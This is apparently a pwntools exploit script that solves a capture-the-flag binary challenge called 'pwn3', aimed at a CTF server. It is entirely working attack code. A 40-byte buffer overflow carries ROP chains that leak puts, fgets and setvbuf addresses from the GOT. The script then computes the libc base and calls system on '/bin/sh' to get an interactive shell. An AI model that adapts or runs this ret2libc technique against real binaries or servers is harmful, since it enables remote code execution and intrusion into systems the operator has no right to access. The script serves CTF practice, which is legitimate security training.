from pwn import *

binary = context.binary = elf = ELF("./pwn3")
libc = ELF("./libc.so")
ld = ELF("./ld.so")

offset = b'i'*40
pop_rdi = 0x401232
ret = 0x40101a

# io = process()
# io = remote('challs.n00bzunit3d.xyz', 42450)


if args.REMOTE:
    io = remote('challs.n00bzunit3d.xyz', 42450)
elif args.GDB:
    io = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path})
else:
    io = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

io.recvuntil(b'flag?\n')
payload = offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
io.sendline(payload)
io.recvuntil(b'}\n')
puts = u64(io.recvline(keepends=False).ljust(8,b'\0'))

io.recvuntil(b'flag?\n')
payload = offset + p64(pop_rdi) + p64(elf.got['fgets']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
io.sendline(payload)
io.recvuntil(b'}\n')
fgets = u64(io.recvline(keepends=False).ljust(8,b'\0'))

io.recvuntil(b'flag?\n')
payload = offset + p64(pop_rdi) + p64(elf.got['setvbuf']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
io.sendline(payload)
io.recvuntil(b'}\n')
setvbuf = u64(io.recvline(keepends=False).ljust(8,b'\0'))

log.info(f'puts: {hex(puts)}\nfgets: {hex(fgets)}\nsetvbuf: {hex(setvbuf)}')

base = puts - 0x80ed0
io.recvuntil(b'flag?\n')
payload = offset + p64(pop_rdi) + p64(base+0x1d8698) + p64(ret) + p64(base+0x50d60)
io.sendline(payload)

io.interactive()